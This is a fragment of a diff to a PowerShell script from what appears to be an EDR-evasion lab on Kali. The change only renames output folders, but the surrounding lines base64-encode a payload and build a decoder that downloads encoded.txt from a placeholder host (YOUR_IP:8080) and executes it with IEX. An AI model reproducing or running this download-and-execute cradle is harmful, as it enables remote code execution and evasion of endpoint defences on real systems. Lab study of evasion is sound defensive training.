@@ -59,7 +59,7 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
 $encodedPayload = [Convert]::ToBase64String($bytes)
 
 # Save encoded payload
-$encodedPayload | Out-File /home/kali/EDRLab/lab1/encoded.txt
+$encodedPayload | Out-File /home/kali/EDRLab/stage1/encoded.txt
 
 # Save decoder script
 @"
@@ -67,7 +67,7 @@ $encodedPayload | Out-File /home/kali/EDRLab/lab1/encoded.txt
 `$encoded = Get-Content http://YOUR_IP:8080/encoded.txt -Raw
 `$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encoded))
 IEX `$decoded
-"@ | Out-File /home/kali/EDRLab/lab1/decoder.ps1
+"@ | Out-File /home/kali/EDRLab/stage1/decoder.ps1
 
 Write-Host "Encoded payload created!" -ForegroundColor Green
 Write-Host "Length: $($encodedPayload.Length) characters" -ForegroundColor Cyan
